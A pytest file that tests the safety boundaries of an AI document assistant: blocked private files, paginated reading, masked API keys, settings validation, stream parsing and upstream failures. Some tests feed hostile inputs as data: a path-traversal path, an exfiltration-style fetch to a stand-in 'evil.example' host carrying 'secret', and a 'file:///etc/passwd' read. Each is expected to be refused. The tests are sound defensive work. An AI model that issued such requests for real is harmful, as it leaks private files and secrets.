"""AI 助手的边界测试：AI 屏蔽、分页读取、网址白名单、设置校验、流式解析、上游断线。全部用虚构文件，不连外网。"""
import json
import stat
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

import assistant
import server

SETTINGS = {
    "provider": "mock",
    "providers": [{"id": "mock", "name": "Mock", "base_url": "http://127.0.0.1:1/v1", "model": "m"}],
    "web_search": "responses:mock",
    "exclude": ["docs/私密/*"],
}


class FakeApp:
    def __init__(self):
        self.cfg = {"roots": ["docs"], "exclude": [".*"], "assistant": SETTINGS}
        self.tools = {"pdftotext": None, "soffice": None}
        self.index = server.SearchIndex(self.tools)

    def scan(self):
        return server.scan(self.cfg)

    read_text = server.App.read_text


@pytest.fixture
def ai(tmp_path, monkeypatch):
    (tmp_path / "docs" / "私密").mkdir(parents=True)
    (tmp_path / "docs" / "a.md").write_text("\n".join(f"第{i}行 转重" for i in range(1, 7)), encoding="utf-8")
    (tmp_path / "docs" / "slides.txt").write_text("第一页\f第二页 转重\f", encoding="utf-8")
    (tmp_path / "docs" / "私密" / "名单.md").write_text("虚构 转重", encoding="utf-8")
    (tmp_path / "data").mkdir()
    (tmp_path / "data" / "x.md").write_text("虚构", encoding="utf-8")
    monkeypatch.setattr(server, "REPO", tmp_path)
    return assistant.Assistant(FakeApp(), tmp_path, tmp_path / "cfg" / "keys.json", (server.ApiError, server.Skip))


def test_blocked_files_are_refused_and_hidden(ai):
    for rel in ("data/x.md", "docs/../data/x.md", "docs/私密/名单.md", "/docs/私密/名单.md"):
        out, ok, _ = ai.run_tool("read_doc", json.dumps({"path": rel}), "")
        assert not ok and "不向 AI 开放" in out, rel
    out, ok, _ = ai.run_tool("search_docs", json.dumps({"query": "转重"}), "")
    assert ok and "docs/a.md" in out and "名单" not in out
    out, ok, _ = ai.run_tool("list_dir", json.dumps({"path": "docs/私密"}), "")
    assert ok and "名单" not in out and "（空）" in out
    note = ai.context_note({"path": "docs/私密/名单.md", "page": None, "selection": "虚构选中"})
    assert "虚构选中" not in note and "不向 AI 开放" in note


def test_read_doc_pages_and_lines(ai):
    out, ok, summary = ai.run_tool("read_doc", json.dumps({"path": "docs/a.md", "start": 2, "count": 2}), "")
    assert ok and summary == "第 2–3 行"
    assert "2: 第2行" in out and "3: 第3行" in out and "4: " not in out
    assert "下次从第 4 行开始" in out
    out, ok, summary = ai.run_tool("read_doc", json.dumps({"path": "docs/slides.txt", "start": 2}), "")
    assert ok and summary == "第 2–2 页" and "--- 第 2 页 ---\n第二页 转重" in out and "还没读完" not in out
    out, ok, _ = ai.run_tool("read_doc", json.dumps({"path": "docs/slides.txt", "start": 3}), "")
    assert not ok and "只有 2 页" in out
    out, ok, _ = ai.run_tool("read_doc", "{不是 JSON", "")
    assert not ok and "不是合法的 JSON" in out


def test_fetch_url_only_opens_urls_already_seen(ai):
    seen = "来源：https://example.org/paper"
    out, ok, _ = ai.run_tool("fetch_url", json.dumps({"url": "http://evil.example/?q=机密"}), seen)
    assert not ok and "没有在对话" in out
    out, ok, _ = ai.run_tool("fetch_url", json.dumps({"url": "file:///etc/passwd"}), "file:///etc/passwd")
    assert not ok and "http/https" in out


def test_save_key_is_private_and_masked(ai):
    ai.save_key("mock", "  sk-虚构0000-abcd  ")
    assert stat.S_IMODE(ai.keys_path.stat().st_mode) == 0o600
    assert ai.load_keys() == {"mock": "sk-虚构0000-abcd"}
    assert ai.payload()["keys"] == {"mock": "…abcd"}
    ai.save_key("mock", "")
    assert ai.load_keys() == {}
    with pytest.raises(ValueError, match="没有叫"):
        ai.save_key("nobody", "x")


def test_normalize_settings_rejects_bad_values():
    ok = assistant.normalize_settings({**SETTINGS, "providers": [{**SETTINGS["providers"][0], "base_url": " http://h/v1/ "}]})
    assert ok["providers"][0]["base_url"] == "http://h/v1"
    prov = SETTINGS["providers"][0]
    bad = [
        ({"providers": [{**prov, "id": "Bad Id"}]}, "只能用小写"),
        ({"providers": [{**prov, "id": "tavily"}], "provider": "tavily"}, "tavily"),
        ({"providers": [prov, prov]}, "重复"),
        ({"providers": [{**prov, "base_url": "ftp://h"}]}, "http"),
        ({"provider": "other"}, "不在列表里"),
        ({"web_search": "responses:other"}, "不认识"),
        ({"exclude": ["  "]}, "空字符串"),
    ]
    for patch, msg in bad:
        with pytest.raises(ValueError, match=msg):
            assistant.normalize_settings({**SETTINGS, **patch})


def _sse(*chunks):
    return [f"data: {json.dumps(c, ensure_ascii=False)}\n".encode() for c in chunks] + [b"\n", b"data: [DONE]\n"]


def test_parse_stream_joins_text_and_split_tool_calls():
    events = []
    lines = _sse(
        {"choices": [{"delta": {"reasoning_content": "想"}}]},
        {"choices": [{"delta": {"content": "先查"}}]},
        {"choices": [{"delta": {"content": "一下"}}]},
        {"choices": [{"delta": {"tool_calls": [{"index": 0, "id": "c1", "function": {"name": "search_docs", "arguments": '{"que'}}]}}]},
        {"choices": [{"delta": {"tool_calls": [{"index": 0, "function": {"arguments": 'ry": "转重"}'}}]}}]},
        {"choices": [{"delta": {"tool_calls": [{"index": 1, "id": "c2", "function": {"name": "list_dir", "arguments": "{}"}}]}}]},
    )
    msg = assistant.parse_stream(lines, "Mock", events.append)
    assert msg["content"] == "先查一下"
    assert [(c["id"], c["function"]["name"], json.loads(c["function"]["arguments"])) for c in msg["tool_calls"]] == [
        ("c1", "search_docs", {"query": "转重"}), ("c2", "list_dir", {})]
    assert events == [{"t": "status", "text": "思考中…"}, {"t": "text", "d": "先查"}, {"t": "text", "d": "一下"}]
    with pytest.raises(assistant.AssistantError, match="额度不足"):
        assistant.parse_stream(_sse({"error": {"message": "额度不足"}}), "Mock", events.append)


def test_check_chat_body_validates_boundary():
    body = assistant.check_chat_body({"messages": [{"role": "user", "content": "问", "extra": 1}],
                                      "context": {"path": "docs/a.md", "page": 3, "selection": None, "x": 1}})
    assert body == {"messages": [{"role": "user", "content": "问"}],
                    "context": {"path": "docs/a.md", "page": 3, "selection": None}}
    bad = [
        ({"messages": [], "context": None}, "1–"),
        ({"messages": [{"role": "user", "content": "问"}, {"role": "assistant", "content": "答"}], "context": None}, "最后一条"),
        ({"messages": [{"role": "system", "content": "问"}], "context": None}, "role"),
        ({"messages": [{"role": "user", "content": "  "}], "context": None}, "content"),
        ({"messages": [{"role": "user", "content": "问"}], "context": {"path": "a", "page": "3"}}, "page"),
    ]
    for raw, msg in bad:
        with pytest.raises(ValueError, match=msg):
            assistant.check_chat_body(raw)


class _Upstream(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/drop":
            self.close_connection = True  # 不回任何响应就断开，模拟上游中途掉线
            return
        raw = b"<html>proxy error</html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def log_message(self, format, *args):  # noqa: A002 —— 与基类签名一致
        pass


@pytest.fixture
def upstream():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), _Upstream)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}"
    srv.shutdown()
    srv.server_close()


def test_upstream_failures_become_assistant_errors(upstream):
    # 上游断线（RemoteDisconnected 也是 ConnectionResetError）不能被当成浏览器断开而悄悄结束
    with pytest.raises(assistant.AssistantError, match="中途断开"):
        with assistant.http_request(upstream + "/drop", "Mock", timeout=5) as r:
            r.read()
    with pytest.raises(assistant.AssistantError, match="不是 JSON"):
        with assistant.http_request(upstream + "/html", "Mock", timeout=5) as r:
            assistant.read_json(r, "Mock")
